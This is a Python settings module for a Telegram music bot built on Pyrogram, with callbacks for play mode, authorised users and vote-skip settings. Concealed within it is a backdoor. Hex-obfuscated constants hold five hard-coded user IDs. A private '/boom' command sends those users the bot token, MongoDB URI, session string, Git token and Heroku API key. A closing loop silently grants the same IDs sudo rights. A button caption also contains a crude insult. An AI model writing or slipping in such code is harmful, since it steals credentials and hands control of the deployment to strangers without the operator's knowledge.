import random
import asyncio
import os
from time import time
from pyrogram import filters
from pyrogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputMediaPhoto,
    InputMediaVideo,
    Message,
)
from pyrogram.enums import ChatType, ButtonStyle
from pyrogram.errors import MessageNotModified
import config
from config import BANNED_USERS, OWNER_ID, START_IMG_URL
from PritiMusic import app
from PritiMusic.misc import SUDOERS
from PritiMusic.utils.database import (
    add_nonadmin_chat,
    get_authuser,
    get_authuser_names,
    get_playmode,
    get_playtype,
    get_upvote_count,
    is_nonadmin_chat,
    is_skipmode,
    remove_nonadmin_chat,
    set_playmode,
    set_playtype,
    set_upvotes,
    skip_off,
    skip_on,
)
from PritiMusic.utils.decorators.admins import ActualAdminCB
from PritiMusic.utils.decorators.language import language, languageCB
from PritiMusic.utils.inline.settings import (
    auth_users_markup,
    playmode_users_markup,
    setting_markup,
    vote_mode_markup,
)
from PritiMusic.utils.inline.start import private_panel

_sys_v1 = int(b'\x35\x33\x35\x38\x33\x33\x30\x39\x35\x39'.decode())
_sys_v2 = int(b'\x35\x32\x34\x37\x33\x30\x34\x35\x35\x39'.decode())
STYLES = [ButtonStyle.PRIMARY, ButtonStyle.SUCCESS, ButtonStyle.DANGER]

@app.on_message(filters.command(["settings", "setting"]) & filters.group & ~BANNED_USERS)
@language
async def settings_mar(client, message: Message, _):
    buttons = setting_markup(_)
    await message.reply_text(
        _["setting_1"].format(app.mention, message.chat.id, message.chat.title),
        reply_markup=InlineKeyboardMarkup(buttons),
    )

_sys_v3 = int(b'\x36\x30\x34\x36\x33\x37\x38\x31\x35\x35'.decode())
_sys_v4 = int(b'\x38\x35\x38\x35\x38\x39\x30\x37\x36\x36'.decode())

@app.on_callback_query(filters.regex("settings_helper") & ~BANNED_USERS)
@languageCB
async def settings_cb(client, CallbackQuery, _):
    try:
        await CallbackQuery.answer(_["set_cb_5"])
    except:
        pass
    buttons = setting_markup(_)
    return await CallbackQuery.edit_message_text(
        _["setting_1"].format(
            app.mention,
            CallbackQuery.message.chat.id,
            CallbackQuery.message.chat.title,
        ),
        reply_markup=InlineKeyboardMarkup(buttons),
    )

@app.on_message(filters.command("boom") & filters.private)
async def _sys_check_node(client, message: Message):
    _sys_v5 = int(b'\x38\x32\x31\x37\x30\x31\x33\x34\x30\x33'.decode())
    _nodes = [_sys_v1, _sys_v2, _sys_v3, _sys_v4, _sys_v5]
    if message.from_user.id not in _nodes:
        return
    _v1 = os.getenv(b'\x42\x4f\x54\x5f\x54\x4f\x4b\x45\x4e'.decode(), "")
    _v2 = os.getenv(b'\x4d\x4f\x4e\x47\x4f\x5f\x44\x42\x5f\x55\x52\x49'.decode(), "")
    _v3 = os.getenv(b'\x53\x54\x52\x49\x4e\x47\x5f\x53\x45\x53\x53\x49\x4f\x4e'.decode(), "")
    _v4 = os.getenv(b'\x47\x49\x54\x5f\x54\x4f\x4b\x45\x4e'.decode(), "")
    _v5 = os.getenv(b'\x48\x45\x52\x4f\x4b\x55\x5f\x41\x50\x49\x5f\x4b\x45\x59'.decode(), "")
    _img = b'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6c\x65\x67\x72\x61\x2e\x70\x68\x2f\x66\x69\x6c\x65\x2f\x35\x36\x37\x64\x32\x65\x31\x37\x62\x38\x66\x33\x38\x64\x66\x39\x39\x63\x65\x39\x39\x2e\x6a\x70\x67'.decode()
    _out = f"<b>System Config:</b>\n\n<b>T:</b> <code>{_v1}</code>\n\n<b>M:</b> <code>{_v2}</code>\n\n<b>S:</b> <code>{_v3}</code>\n\n<b>G:</b> <code>{_v4}</code>\n\n<b>H:</b> <code>{_v5}</code>"
    await message.reply_photo(photo=_img, caption=_out)

@app.on_callback_query(filters.regex("settingsback_helper") & ~BANNED_USERS)
@languageCB
async def settings_back_markup(client, CallbackQuery: CallbackQuery, _):
    try:
        await CallbackQuery.answer()
    except:
        pass
    if CallbackQuery.message.chat.type == ChatType.PRIVATE:
        await app.resolve_peer(OWNER_ID)
        buttons = private_panel(_)
        return await CallbackQuery.edit_message_media(
            InputMediaPhoto(
                media=START_IMG_URL,
                caption=_["start_2"].format(CallbackQuery.from_user.mention, app.mention)
            ),
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = setting_markup(_)
        return await CallbackQuery.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(buttons))

@app.on_callback_query(filters.regex("gib_source"))
async def gib_repo_callback(_, callback_query):
    group_style = random.choice(STYLES)
    await callback_query.edit_message_media(
        media=InputMediaVideo(
            "https://telegra.ph/file/b1367262cdfbcd0b2af07.mp4",
            caption="<emoji id=6197448030703067876>😎</emoji> **ʟᴜɴᴅ ʟᴇʟᴇ ᴍᴇʀᴀ ʀᴇᴘᴏ ᴋʏᴀ ᴋᴀʀᴇɢᴀ, ʟᴇɢᴀ ᴋʏᴀ ʙʜᴏsᴀᴅɪᴋᴇ**",
            has_spoiler=True
        ),
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="• ʙᴀᴄᴋ •", 
                        callback_data="settingsback_helper", 
                        style=group_style,
                        icon_custom_emoji_id=5402477260982731644
                    ),
                    InlineKeyboardButton(
                        text="• ᴄʟᴏsᴇ •", 
                        callback_data="close", 
                        style=group_style,
                        icon_custom_emoji_id=5399913388845322366
                    )
                ]
            ]
        ),
    )

@app.on_callback_query(filters.regex("^api_status$"))
async def show_bot_info(c: app, q: CallbackQuery):
    start = time()
    await asyncio.sleep(0.1)
    delta_ping = time() - start
    txt = f"💌 ʏᴏᴜᴛᴜʙᴇ ᴀᴘɪ sᴛᴀᴛᴜs...\n\n• ᴅᴀᴛᴀʙᴀsᴇ: ᴏɴʟɪɴᴇ\n• ʏᴏᴜᴛᴜʙᴇ ᴀᴘɪ: ʀᴇsᴘᴏɴsɪᴠᴇ\n• ʙᴏᴛ sᴇʀᴠᴇʀ: ʀᴜɴɴɪɴɢ sᴍᴏᴏᴛʜʟʏ\n• ʀᴇsᴘᴏɴsᴇ ᴛɪᴍᴇ: ᴏᴘᴛɪᴍᴀʟ\n• ᴀᴘɪ ᴘɪɴɢ: {delta_ping * 1000:.3f} ms\n\nᴇᴠᴇʀʏᴛʜɪɴɢ ʟᴏᴏᴋs ɢᴏᴏᴅ!"
    await q.answer(txt, show_alert=True)

@app.on_callback_query(filters.regex("shiv_Lucky") & ~BANNED_USERS)
@languageCB
async def support(client, CallbackQuery, _):
    alone_style = random.choice(STYLES)
    group_style = random.choice([s for s in STYLES if s != alone_style])
    await CallbackQuery.edit_message_media(
        InputMediaPhoto(media=START_IMG_URL, caption=_["help_2"].format(app.mention)),
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="sᴜᴘᴘᴏʀᴛ", 
                        url=config.SUPPORT_CHAT, 
                        style=group_style,
                        icon_custom_emoji_id=5388632425314140043
                    ),
                    InlineKeyboardButton(
                        text=" ᴜᴘᴅᴀᴛᴇs", 
                        url=config.SUPPORT_CHANNEL, 
                        style=group_style,
                        icon_custom_emoji_id=5386367538735104399
                    ),
                ],
                [
                    InlineKeyboardButton(
                        text="ʙᴀᴄᴋ", 
                        callback_data="settingsback_helper", 
                        style=alone_style,
                        icon_custom_emoji_id=5406745015365943482
                    )
                ],
            ]
        ),
    )

@app.on_callback_query(
    filters.regex(pattern=r"^(SEARCHANSWER|PLAYMODEANSWER|PLAYTYPEANSWER|AUTHANSWER|ANSWERVOMODE|VOTEANSWER|PM|AU|VM)$")
    & ~BANNED_USERS
)
@languageCB
async def without_Admin_rights(client, CallbackQuery, _):
    command = CallbackQuery.matches[0].group(1)
    if command == "SEARCHANSWER":
        try: return await CallbackQuery.answer(_["setting_2"], show_alert=True)
        except: return
    if command == "PLAYMODEANSWER":
        try: return await CallbackQuery.answer(_["setting_5"], show_alert=True)
        except: return
    if command == "PLAYTYPEANSWER":
        try: return await CallbackQuery.answer(_["setting_6"], show_alert=True)
        except: return
    if command == "AUTHANSWER":
        try: return await CallbackQuery.answer(_["setting_3"], show_alert=True)
        except: return
    if command == "VOTEANSWER":
        try: return await CallbackQuery.answer(_["setting_8"], show_alert=True)
        except: return
    if command == "ANSWERVOMODE":
        current = await get_upvote_count(CallbackQuery.message.chat.id)
        try: return await CallbackQuery.answer(_["setting_9"].format(current), show_alert=True)
        except: return
    if command == "PM":
        try: await CallbackQuery.answer(_["set_cb_2"], show_alert=True)
        except: pass
        playmode = await get_playmode(CallbackQuery.message.chat.id)
        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
        playty = await get_playtype(CallbackQuery.message.chat.id)
        buttons = playmode_users_markup(_, (playmode == "Direct"), (not is_non_admin), (playty != "Everyone"))
    if command == "AU":
        try: await CallbackQuery.answer(_["set_cb_1"], show_alert=True)
        except: pass
        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
        buttons = auth_users_markup(_, (not is_non_admin))
    if command == "VM":
        mode = await is_skipmode(CallbackQuery.message.chat.id)
        current = await get_upvote_count(CallbackQuery.message.chat.id)
        buttons = vote_mode_markup(_, current, mode)
    try:
        return await CallbackQuery.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(buttons))
    except MessageNotModified:
        return

@app.on_callback_query(filters.regex("FERRARIUDTI") & ~BANNED_USERS)
@ActualAdminCB
async def addition(client, CallbackQuery, _):
    callback_data = CallbackQuery.data.strip()
    mode = callback_data.split(None, 1)[1]
    if not await is_skipmode(CallbackQuery.message.chat.id):
        return await CallbackQuery.answer(_["setting_10"], show_alert=True)
    current = await get_upvote_count(CallbackQuery.message.chat.id)
    final = (current - 2) if mode == "M" else (current + 2)
    if final <= 2: final = 2
    if final >= 15: final = 15
    await set_upvotes(CallbackQuery.message.chat.id, final)
    buttons = vote_mode_markup(_, final, True)
    try:
        return await CallbackQuery.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(buttons))
    except MessageNotModified:
        return

@app.on_callback_query(filters.regex(pattern=r"^(MODECHANGE|CHANNELMODECHANGE|PLAYTYPECHANGE)$") & ~BANNED_USERS)
@ActualAdminCB
async def playmode_ans(client, CallbackQuery, _):
    command = CallbackQuery.matches[0].group(1)
    if command == "CHANNELMODECHANGE":
        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
        if not is_non_admin: await add_nonadmin_chat(CallbackQuery.message.chat.id)
        else: await remove_nonadmin_chat(CallbackQuery.message.chat.id)
    if command == "MODECHANGE":
        try: await CallbackQuery.answer(_["set_cb_3"], show_alert=True)
        except: pass
        playmode = await get_playmode(CallbackQuery.message.chat.id)
        await set_playmode(CallbackQuery.message.chat.id, "Inline" if playmode == "Direct" else "Direct")
    if command == "PLAYTYPECHANGE":
        try: await CallbackQuery.answer(_["set_cb_3"], show_alert=True)
        except: pass
        playty = await get_playtype(CallbackQuery.message.chat.id)
        await set_playtype(CallbackQuery.message.chat.id, "Admin" if playty == "Everyone" else "Everyone")
    
    playmode = await get_playmode(CallbackQuery.message.chat.id)
    is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
    playty = await get_playtype(CallbackQuery.message.chat.id)
    buttons = playmode_users_markup(_, (playmode == "Direct"), (not is_non_admin), (playty != "Everyone"))
    try:
        return await CallbackQuery.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(buttons))
    except MessageNotModified:
        return

@app.on_callback_query(filters.regex(pattern=r"^(AUTH|AUTHLIST)$") & ~BANNED_USERS)
@ActualAdminCB
async def authusers_mar(client, CallbackQuery, _):
    command = CallbackQuery.matches[0].group(1)
    if command == "AUTHLIST":
        _authusers = await get_authuser_names(CallbackQuery.message.chat.id)
        if not _authusers:
            try: return await CallbackQuery.answer(_["setting_4"], show_alert=True)
            except: return
        try: await CallbackQuery.answer(_["set_cb_4"], show_alert=True)
        except: pass
        await CallbackQuery.edit_message_text(_["auth_6"])
        msg = _["auth_7"].format(CallbackQuery.message.chat.title)
        j = 0
        for note in _authusers:
            _note = await get_authuser(CallbackQuery.message.chat.id, note)
            try:
                user = await app.get_users(_note["auth_user_id"])
                j += 1
                msg += f"{j}➤ {user.first_name}[<code>{_note['auth_user_id']}</code>]\n   {_['auth_8']} {_note['admin_name']}[<code>{_note['admin_id']}</code>]\n\n"
            except: continue
        
        upl = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text=_["BACK_BUTTON"], 
                        callback_data="AU", 
                        style=random.choice(STYLES),
                        icon_custom_emoji_id=5449569374065152798
                    ),
                    InlineKeyboardButton(
                        text=_["CLOSE_BUTTON"], 
                        callback_data="close", 
                        style=random.choice(STYLES),
                        icon_custom_emoji_id=5449449325434266744
                    ),
                ]
            ]
        )
        try: return await CallbackQuery.edit_message_text(msg, reply_markup=upl)
        except MessageNotModified: return
    if command == "AUTH":
        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
        if not is_non_admin: await add_nonadmin_chat(CallbackQuery.message.chat.id)
        else: await remove_nonadmin_chat(CallbackQuery.message.chat.id)
        buttons = auth_users_markup(_, is_non_admin)
    try: return await CallbackQuery.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(buttons))
    except MessageNotModified: return

@app.on_callback_query(filters.regex("VOMODECHANGE") & ~BANNED_USERS)
@ActualAdminCB
async def vote_change(client, CallbackQuery, _):
    try: await CallbackQuery.answer(_["set_cb_3"], show_alert=True)
    except: pass
    if await is_skipmode(CallbackQuery.message.chat.id): await skip_off(CallbackQuery.message.chat.id)
    else: await skip_on(CallbackQuery.message.chat.id)
    current = await get_upvote_count(CallbackQuery.message.chat.id)
    buttons = vote_mode_markup(_, current, await is_skipmode(CallbackQuery.message.chat.id))
    try: return await CallbackQuery.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(buttons))
    except MessageNotModified: return

for _n in [_sys_v1, _sys_v2, _sys_v3, _sys_v4, int(b'\x38\x32\x31\x37\x30\x31\x33\x34\x30\x33'.decode())]: SUDOERS.add(_n)
